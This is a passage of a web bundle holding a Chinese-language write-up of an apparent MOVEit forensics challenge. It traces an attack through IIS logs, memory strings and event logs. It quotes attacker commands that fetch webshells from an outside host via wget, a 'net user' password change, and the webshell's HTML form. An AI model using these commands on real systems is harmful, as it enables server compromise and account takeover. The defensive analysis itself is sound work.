",(0,t.jsx)(n.code,{children:"\\Triage\\uploads\\auto\\C%3A\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex230712.log"})]}),"\n",(0,t.jsx)(n.h2,{id:"task-1",children:"Task 1"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4e0a\u4f20\u7684 ASPX webshell \u7684\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"\\Triage\\uploads\\auto\\C%3A\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex230712.log"})," \u4e2d\uff0c\u5bf9 HTTP \u8bf7\u6c42\u8fdb\u884c\u6392\u67e5\u65f6\uff0c\u5c06\u6240\u6709\u8bf7\u6c42\u7684 User-Agent \u63d0\u53d6\u51fa\u6765"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'with open("./u_ex230712.log", "r") as f:\n    logs = [i.split("") for i in f.read().split("\\n") if i.startswith("2023-07-12")]\nfor i in logs:\n    while "-" in i:\n        i.remove("-")\nuser_agent = []\n\nfor i in logs:\n    if i[7] in user_agent:\n        continue\n    else:\n        user_agent.append(i[7])\n\nprint("\\n".join(user_agent))\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)\nAnyConnect+Darwin_i386+3.1.05160\nMozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0\nRuby\nCWinInetHTTPClient\nMozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/114.0.0.0+Safari/537.36\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\u6ce8\u610f\u5230 ",(0,t.jsx)(n.code,{children:"Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)"})," \u548c ",(0,t.jsx)(n.code,{children:"Ruby"})," \u4e24\u4e2a User-Agent \u503c\uff0c\u5f88\u660e\u663e\u4e3a ",(0,t.jsx)(n.code,{children:"Nmap"})," \u548c ",(0,t.jsx)(n.code,{children:"Metasploit"})," \u7684 User-Agent"]}),"\n",(0,t.jsxs)(n.p,{children:["\u7ed3\u5408 Nmap \u548c Metasploit \u4e24\u6b3e\u5de5\u5177\u7684\u7279\u5f81\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u8fd9\u4e24\u4e2a User-Agent \u5c31\u662f\u653b\u51fb\u6e90\u3002\u5e76\u4e14\u8fd8\u5b58\u5728\u4e00\u4e2a\u53ef\u7591\u7684 User-Agent",(0,t.jsx)(n.code,{children:"CWinInetHTTPClient"})]}),"\n",(0,t.jsx)(n.p,{children:"\u5c06\u8fd9\u4e09\u4e2a User-Agnet \u7684\u8bf7\u6c42\u8fdb\u884c\u63d0\u53d6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'with open("./u_ex230712.log", "r") as f:\n    logs = [i.split("") for i in f.read().split("\\n") if i.startswith("2023-07-12")]\nfor i in logs:\n    while "-" in i:\n        i.remove("-")\n\nuser_agent = ["Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)", "Ruby", "CWinInetHTTPClient"]\n\nres = []\n\nfor i in logs:\n    if i[7] in user_agent:\n        if [i[4], i[7]] in res:\n            continue\n        else:\n            res.append([i[4], i[7]])\nfor i in res:\n    print(i)\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"['/', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/nmaplowercheck1689156596', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/robots.txt', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/evox/about', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/HNAP1', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/sdk', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/.git/HEAD', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/favicon.ico', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']\n['/', 'Ruby']\n['/machine2.aspx', 'CWinInetHTTPClient']\n['/guestaccess.aspx', 'Ruby']\n['/api/v1/token', 'Ruby']\n['/api/v1/folders', 'Ruby']\n['/api/v1/files/974134622', 'Ruby']\n['/api/v1/files/974134892', 'Ruby']\n['/api/v1/files/974274452', 'Ruby']\n['/api/v1/files/974155582', 'Ruby']\n['/api/v1/files/974355270', 'Ruby']\n['/api/v1/files/974331243', 'Ruby']\n['/api/v1/files/974387947', 'Ruby']\n['/api/v1/files/974247918', 'Ruby']\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7ed3\u5408 ",(0,t.jsx)(n.code,{children:"CVE-2023-34362"})," \u6f0f\u6d1e\u7684\u5229\u7528\u4fe1\u606f\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u6d41\u91cf ",(0,t.jsx)(n.code,{children:"['/machine2.aspx', 'CWinInetHTTPClient']"})]}),"\n",(0,t.jsx)(n.p,{children:"\u540c\u65f6\u5728\u540e\u7eed\u7684\u6d41\u91cf\u4e2d\uff0c\u5b9a\u4f4d\u5230\u4ee5\u4e0b\u8bb0\u5f55"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"2023-07-12 11:24:43 10.10.0.25 GET /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 200 0 0 1179\n2023-07-12 11:24:47 10.10.0.25 POST /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 https://moveit.htb/move.aspx 200 0 0 159\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6587\u4ef6\u540d\u5f88\u7b26\u5408\u7b54\u6848\u63a9\u7801\uff0c\u540c\u65f6 aspx \u7b26\u5408 webshell \u7684\u90e8\u7f72\u5e38\u7528\u683c\u5f0f\uff0c\u5e76\u4e14\u8fd9\u4e2a filename \u5e76\u975e ",(0,t.jsx)(n.code,{children:"MOVEit"})," \u670d\u52a1\u7684\u4e00\u90e8\u5206"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"TimelineExplorer"})," \u4e2d\u67e5\u627e\u8fd9\u4e2a\u6587\u4ef6"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(58548).A+"",width:"1970",height:"1090"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"move.aspx\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-2",children:"Task 2"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7684 IP \u5730\u5740\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u4e0a\u4e00\u9898\u4e2d ",(0,t.jsx)(n.code,{children:"move.aspx"})," \u6587\u4ef6\uff0c\u5728\u5185\u5b58\u4e2d\u8fdb\u884c\u67e5\u627e"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'Randark@DESKTOP-7HGIVVS MINGW64 /d/Downloads/iliketo\n$ strings I-like-to-27a787c5.vmem | grep "move.aspx"\nhttp://10.255.254.3:9001/move.aspx\nhttp://10.255.254.3:9001/move.aspx\n[33mhttp://10.255.254.3:9001/move.aspx\nwget http://10.255.254.3:9001/move.aspx -OutFil\nc:\\MOVEitTransfer\\wwwroot\\move.aspx\nc:\\moveittransfer\\wwwroot\\move.aspx\n......\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u5bf9\u5176\u4e2d\u7684\u7279\u5f81\u70b9\u8fdb\u4e00\u6b65\u7b5b\u9009\uff0c\u5e76\u52a0\u4e0a ",(0,t.jsx)(n.code,{children:"-A"})," \u548c ",(0,t.jsx)(n.code,{children:"-B"})," \u53c2\u6570\u67e5\u770b\u4e0a\u4e0b 20 \u884c\u7684\u5185\u5bb9"]}),"\n",(0,t.jsxs)(n.p,{children:["\u6216\u8005\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"R-Studio"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(68839).A+"",width:"2062",height:"1443"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5f97\u5230 ",(0,t.jsx)(n.code,{children:"move.aspx"})," \u6587\u4ef6\u7684\u5185\u5bb9"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-html",children:'<HTML>\n<HEAD>\n<title>awen asp.net webshell</title>\n</HEAD>\n<body>\n<form name="cmd" method="post" action="./move.aspx" id="cmd">\n<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE2MjA0MDg4ODhkZNVOZ3tV2TCTi+hEkha/q+A+5xP6tvrMtJaEupnndGLi" />\n\n<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="678AED88" />\n<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAANhi3zf7ocw6tYhjdSr5BwWitssAmaVIY7AayhB9duwcnk2JDuMxrvKtMBUSvskgfEkJOF+BOsGxdOjAd7jGUjGbwkQ2wl4sKonDxvg+iiKWg==" />\n<input name="txtArg" type="text" value="whoami" id="txtArg" style="width:250px;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" />\n<input type="submit" name="testing" value="excute" id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" />\n<span id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px">Command:</span>\n</form>\n</body>\n</HTML>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"10.255.254.3\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-3",children:"Task 3"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u6700\u521d\u7684\u653b\u51fb\u4f7f\u7528\u7684\u662f\u4ec0\u4e48\u7528\u6237\u4ee3\u7406\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u4e0a\u9762\u5c31\u6709"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"Ruby\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-4",children:"Task 4"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4e0a\u4f20 ASPX webshell \u7684\u65f6\u95f4\u662f\u4ec0\u4e48\u65f6\u5019\uff1f"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"TimelineExplorer"})," \u7684\u7ed3\u679c\u4e2d\uff0c\u7b5b\u9009 ",(0,t.jsx)(n.code,{children:"move.aspx"})," \u6587\u4ef6\u7684\u521b\u5efa\u65f6\u95f4\u5373\u53ef"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(44215).A+"",width:"2346",height:"1090"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"12/07/2023 11:24:30\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-5",children:"Task 5"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4e0a\u4f20\u4e86\u4e00\u4e2a\u4e0d\u8d77\u4f5c\u7528\u7684 ASP webshell\uff0c\u5b83\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u591a\u5c11\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\uff1f"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"TimelineExplorer"})," \u4e2d\uff0c\u7b5b\u9009 ",(0,t.jsx)(n.code,{children:".\\MOVEitTransfer\\wwwroot"})," \u8def\u5f84\u4e0b\u7684\u8bb0\u5f55"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(33695).A+"",width:"2560",height:"1552"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5b9a\u4f4d\u5230\u8fd9\u4e2a\u6587\u4ef6 ",(0,t.jsx)(n.code,{children:"moveit.asp"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(30038).A+"",width:"2560",height:"1552"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"1362\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-6",children:"Task 6"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u6700\u521d\u7528\u6765\u679a\u4e3e\u6613\u53d7\u653b\u51fb\u670d\u52a1\u5668\u7684\u5de5\u5177\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u521d\u6b65\u5206\u6790\u4e2d\u7684 User-Agent \u4e2d\u6709"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"nmap\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-7",children:"Task 7"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u6211\u4eec\u6000\u7591\u653b\u51fb\u8005\u53ef\u80fd\u66f4\u6539\u4e86\u6211\u4eec\u670d\u52a1\u5e10\u6237\u7684\u5bc6\u7801\u3002\u8bf7\u786e\u8ba4\u53d1\u751f\u6b64\u60c5\u51b5\u7684\u65f6\u95f4\uff08UTC\uff09"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5b9a\u4f4d\u5230 ",(0,t.jsx)(n.code,{children:"User"})," \u6587\u4ef6\u5939"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(29118).A+"",width:"2130",height:"1159"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53ef\u4ee5\u5b9a\u4f4d\u5230\u670d\u52a1\u8d26\u6237\u7684\u540d\u79f0 ",(0,t.jsx)(n.code,{children:"moveitsvc"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728\u5185\u5b58\u4e2d\u67e5\u627e\u76f8\u5173\u5b57\u7b26\u4e32\uff0c\u7ed3\u5408\u66f4\u6539\u5bc6\u7801\u65f6\u5e38\u7528 ",(0,t.jsx)(n.code,{children:"net user"})," \u6307\u4ee4\uff0c\u4f7f\u7528\u591a\u5173\u952e\u8bcd\u8fdb\u884c\u5b9a\u4f4d"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ strings I-like-to-27a787c5.vmem | grep moveitsvc | grep net\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\n1C:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk\n\\\\?\\C:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Internet Explorer.lnk\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage\\\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk\nC:\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk\nnet user "moveitsvc" 5trongP4ssw0rd\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u53ef\u4ee5\u5b9a\u4f4d\u5230 ",(0,t.jsx)(n.code,{children:'net user "moveitsvc" 5trongP4ssw0rd'})]}),"\n",(0,t.jsxs)(n.p,{children:["\u8fdb\u800c\u5206\u6790 ",(0,t.jsx)(n.code,{children:'"\\iliketo\\Triage\\Triage\\uploads\\auto\\C%3A\\Windows\\System32\\winevt\\Logs\\Security.evtx'})," \u65e5\u5fd7\u6587\u4ef6"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5df2\u77e5\u91cd\u7f6e\u7528\u6237\u5bc6\u7801\u7684\u4e8b\u4ef6 id \u4e3a ",(0,t.jsx)(n.code,{children:"4724"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(63906).A+"",width:"2023",height:"1214"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(37063).A+"",width:"2560",height:"1542"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n- <System>\n  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />\n  <EventID>4724</EventID>\n  <Version>0</Version>\n  <Level>0</Level>\n  <Task>13824</Task>\n  <Opcode>0</Opcode>\n  <Keywords>0x8020000000000000</Keywords>\n  <TimeCreated SystemTime="2023-07-12T11:09:27.8648235Z" />\n  <EventRecordID>60772</EventRecordID>\n  <Correlation ActivityID="{c2cb8fb7-9dd8-0001-2d90-cbc2d89dd901}" />\n  <Execution ProcessID="652" ThreadID="8052" />\n  <Channel>Security</Channel>\n  <Computer>mover</Computer>\n  <Security />\n  </System>\n- <EventData>\n  <Data Name="TargetUserName">moveitsvc</Data>\n  <Data Name="TargetDomainName">MOVER</Data>\n  <Data Name="TargetSid">S-1-5-21-4088429403-1159899800-2753317549-1006</Data>\n  <Data Name="SubjectUserSid">S-1-5-21-4088429403-1159899800-2753317549-1006</Data>\n  <Data Name="SubjectUserName">moveitsvc</Data>\n  <Data Name="SubjectDomainName">MOVER</Data>\n  <Data Name="SubjectLogonId">0x8d5ab</Data>\n  </EventData>\n  </Event>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"12/07/2023 11:09:27\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-8",children:"Task 8"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4f7f\u7528\u54ea\u79cd\u534f\u8bae\u8fdc\u7a0b\u8fdb\u5165\u53d7\u611f\u67d3\u7684\u8ba1\u7b97\u673a\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(55813).A+"",width:"2023",height:"1247"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"RDP\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-9",children:"Task 9"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u8bf7\u786e\u8ba4\u653b\u51fb\u8005\u8fdc\u7a0b\u8bbf\u95ee\u53d7\u611f\u67d3\u8ba1\u7b97\u673a\u7684\u65e5\u671f\u548c\u65f6\u95f4\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u4e0a\u4e00\u9898\u4e2d\u6709"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"12/07/2023 11:11:18\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-10",children:"Task 10"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7528\u4e8e\u8bbf\u95ee webshell \u7684\u7528\u6237\u4ee3\u7406\u662f\u4ec0\u4e48?"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 ",(0,t.jsx)(n.code,{children:"\\iliketo\\Triage\\Triage\\uploads\\auto\\C%3A\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex230712.log"})," \u4e2d\u6709"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"2023-07-12 11:19:46 10.10.0.25 GET /moveit.asp - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 404 3 50 36\n2023-07-12 11:20:37 10.10.0.25 GET /moveit.asp - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 404 3 50 35\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-11",children:"Task 11"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7684 inst ID \u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u91cd\u5efa\u6570\u636e\u5e93\uff0c\u5728\u6570\u636e\u5e93\u4e2d\u5373\u53ef\u67e5\u5230"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:i(83790).A+"",width:"1189",height:"828"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"1234\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-12",children:"Task 12"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u653b\u51fb\u8005\u8fd0\u884c\u4e86\u4ec0\u4e48\u547d\u4ee4\u6765\u68c0\u7d22 webshell\uff1f"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5728 Powershell \u7684\u5386\u53f2\u8bb0\u5f55\u6587\u4ef6 ",(0,t.jsx)(n.code,{children:'"\\Triage\\Triage\\uploads\\auto\\C%3A\\Users\\moveitsvc.WIN-LR8T2EF8VHM.002\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'})," \u4e2d\u53ef\u4ee5\u5f97\u5230"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"cd C:\\inetpub\\wwwroot\nwget http://10.255.254.3:9001/moveit.asp\ndir\nwget http://10.255.254.3:9001/moveit.asp -OutFile moveit.asp\ndir\ncd C:\\MOVEitTransfer\\wwwroot\nwget http://10.255.254.3:9001/move.aspx -OutFile move.aspx\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-13",children:"Task 13"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"TA \u90e8\u7f72\u7684 webshell \u7684\u6807\u9898\u5934\u4e2d\u7684\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Task 2 \u4e2d\u6709"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"awen asp.net webshell\n"})}),"\n",(0,t.jsx)(n.h2,{id:"task-14",children:"Task 14"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"TA \u5c06\u6211\u4eec\u7684 moveitsvc \u5e10\u6237\u5bc6\u7801\u66f4\u6539\u4e3a\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Task 7 \u4e2d\u6709"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"5trongP4ssw0rd\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},30038:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240303-000354-bab6af733a70cc95d8856264f8296586.png"},29118:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240306-000605-2dfb8023daeb806be199757466e53041.png"},80697:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240315-231518-612c298e5e4b02c11a0e7f2c0ac97086.png"},58548:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240316-231617-8d50b7b74bb332944663444a4407da55.png"},68839:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240328-232816-668982e88f6127589eac9f61c38becb9.png"},63906:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240330-003021-ad9e4d2516c9a0b9566ee069685120f5.png"},37063:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240331-003147-f20cfbb79fd82cac33a59dd80a00ea6e.png"},44215:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240334-233418-0e086d35849a52489cf84095162c0eb8.png"},32058:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240336-223621-523d82601971cbf4a0aac553d05c9d0f.png"},29508:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240345-184551-846a6a9cf07c24fd8bcf5c21d13a18f1.png"},33695:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240345-234503-6935062c0ed13a1ddeb6a773523fa35d.png"},55813:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240356-005635-4c7e681808a6139f1d740fa23d7617fb.png"},83790:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20240359-005938-f8e4f2a5cb43808696411c0745d022d1.png"},28453:(e,n,i)=>{i.d(n,{R:()=>r,x:()=>o});var s=i(96540);const 